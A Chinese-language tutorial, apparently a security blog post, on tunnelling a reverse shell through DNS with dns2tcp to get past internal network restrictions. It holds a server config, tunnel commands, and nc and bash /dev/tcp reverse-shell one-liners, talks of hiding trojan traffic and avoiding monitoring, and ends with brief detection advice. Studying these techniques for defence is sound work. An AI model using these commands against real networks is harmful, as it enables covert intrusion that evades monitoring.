利用DNS隧道反弹SHELL

前言

 在现阶段的安全防御体系中，很多单位、公司内外网防御更注重TCP、UDP流量的检测拦截，而往往忽略DNS、ICMP、HTTP/HTTPS等难于禁止的协议(可能有些单位对ICMP控制也很严格)，而这些协议往往成为黑客建立隐蔽隧道的“常客”。此文讲述的是利用DNS隧道突破内网限制进行反弹shell。


DNS隧道原理解析

基本原理

首先，让我们先看一张图：

当内网区域的任意一台服务器或PC机向本地DNS服务器C发起aaa.wlhk.com的请求，C不知道aaa.wlhk.com具体指向那里，于是通过互联网找到wlhk.com DNS服务器B去解析三级域名aaa.wlhk.com，最后将请求到的结果返回到内网发起请求的服务器或PC机。并且内网区域所有跟*.wlhk.com的三级域名流量信息，都会通过两台DNS服务器B、C进行传播，而“*.wlhk.com”的“*”可是是别的字符，比如“bbbbbaada.wlhk.com”，这样内网区域的任意被控服务器或PC便可以通过DNS解析将“bbbbbaada”这条“消息”（或者说是字符）传给DNS服务器B。如果发送多个请求，便形成了通信，相当于建立在DNS协议的通信隧道。

D对B说：i love you

B对D说：wo ai ni    

攻击流程图理解

为了让大家更好的理解DNS隧道，采用一个hacker利用内网被控制的机器发送信息的攻击流程来解释。


Step1：黑客利用内网被控制的机器发送查询*.wlhk.com的请求；

Step2：本地DNS服务器通过防火墙后，向互联网中的根DNS服务器发送查询请求；

Step3：经过互联网多层DNS解析查询之后，DNS请求到达wlhk.com的DNS解析服务器(该服务器已被Hacker控制)；

Step4：响应结果通过防火墙进入内网区；

Step5：响应结果返回到本地DNS服务器；

Step6：本地DNS服务器将响应结果返回给被Hacker控制的机器。


应用

最经典的三种应用：

A.绕过上网限制进行免费上网。

B.绕过内网限制进行机器控制。

C.加密“木马通信流量”传输，防止被发现。

同时，常见的也可利用DNS隧道来传递文件、端口转发等，结合其他漏洞进行利用和隐藏的也有很多方式，重点在于灵活结合~（欢迎各位大佬不吝赐教各种骚姿势）


反弹SHELL

实验环境

其中，wlhk.com DNS服务器(主控端：192.168.131.132)和被haker控制的机器(被控端：192.168.131.146)使用防火墙做好限制，不互通。环境中配置好DNS解析之后，wlhk DNS服务器需配置a.wlhk.com的解析指向本机IP：192.168.131.132，为了达到所有*.a.wlhk.com的流量都指向wlhk.com DNS服务器(主控端)。

注：实验用的是利用四级域名中的变化来传递信息，原理讲解中的是利用三级域名的变化来传递信息
a.wlhk.com NS b.wlhk.com
b.wlhk.com A  192.168.131.132


获取SHELL

实现DNS隧道的工具有很多，比如Dns2tcp(Linux，windows版)、 Dnscat2、 iodineDnscat2、 OzymanDNS等，可实现加密传输等，此处示例以dns2tcp做演示，dns2tcp的主控端必须是linux，被控端可以是linux或windows。

1、安装工具

先从https://download.csdn.net/download/localhost01/10932795下载工具，然后解压编译安装(主控端和被控端都需要安装)

tar zxf dns2tcp-0.5.2.tar.gz          
cd dns2tcp-0.5.2          
./configure          
make&make install


2、主控端(服务器端)

在/etc/路径下，新建dns2tcpd.conf文件，进行以下配置

listen = 192.168.131.132（本机IP）  
port = 53  
#系统用户名
user = root
# 执行文件位置(刚下载解压后位置)
chroot = /root/dns2tcp-0.5.2    
# 解析的域名
domain = a.wlhk.com(与NS记录中的域名相同)  
# 提供出来可使用的资源列表 
resources = ssh:127.0.0.1:22,http:127.0.0.1:8082,nc:127.0.0.1:8080

resources说明

resources里面配置的是dns2tcp供客户端（被控端）使用的资源。作用是：客户端在本地监听一个端口，并指定使用的资源，当有数据往端口传送后，dns2tcp客户端将数据用DNS协议传动到服务器（主控端），然后服务器将数据转发到对应的资源配置的端口中。 被控端使用-r参数进行指定，如以下命令“dns2tcpc -d 3 -l 1111 -r nc -z a.wlhk.com 192.168.131.132”，表示被控端指定本地的1111端口与主控端的8080端口（nc对应主控端的8080端口）通信。

主控端（服务器端）输入如下命令，进入等待连接状态（注：到工具解压的目录下执行）

dns2tcpd  -F -d 3 -f /etc/dns2tcpd.conf
//参数说明：
-F 代表前台运行                       -c 启动流量压缩
-d 代表最大程度的debug                -r 代表你选择的资源


3、被控端(客户端)

输入如下命令，将本地的2222端口与远程的“nc”对应的端口进行建立DNS隧道

dns2tcpc -d 3 -l 2222 -r nc -z a.wlhk.com 192.168.131.132 //ip为服务端IP
//参数说明
-z 代表指定的域名                      -l 代表指定的本地端口
显示如下


4、反弹shell

在主控端(服务器端，新建一个shell页面，否则可能停止命令)使用NC工具进行对8080监听

nc -lvvp 8080

在被控端(客户端)使用NC工具通过本地绑定端口2222进行反弹shell

nc -e /bin/bash 127.0.0.1 2222

可成功反弹shell，在主控端输入ifconfig命令进行验证。

问题：被控端没有nc工具咋办？？没法连接外网下载。

答：没问题，我们可以使用bash命令进行反弹shell(仅限于linux系统，windows系统自查)

bash -i >& /dev/tcp/127.0.0.1/2222 0>&1

5、验证DNS原理。

我们可以在被控端和主控端使用dns2tcp工具的地方发现DNS解析的记录，可发现此处利用四级域名*.a.wlhk.com来传递shell信息。

实战思考

1.这是否支持加密？
答：支持加密，各种工具均可加密，懂的大神还可以自己编辑加密算法，让别人猜不出你发送的具体是什么。
2.已经有内网控制机器的权限，为什么还要用DNS隧道？？
答：这个问题，其实我也思考了很久，我想到两个方面：
第一方面是达到隐藏的目的，不容易被监控防御系统发现，毕竟很多系统对于DNS流量的监控不到位。
第二方面是方便进一步渗透，方便绕过限制，把工具、文件等传入到内网系统，进行进一步的渗透。
其他方面暂时想不到了，也希望各位大佬进行补充...........

检测与防御


使用DNS隧道会有如下几个特征：DNS频率大、域名不重复、域名很长、常用TXT传播。可根据以上特征对防御机制设定规则，也有免费的DNS隧道通信检测工具：https://github.com/cisp/DNSTunnelDetectTools。至于高端一点儿的检测技术可参考：DNS隧道检测技术
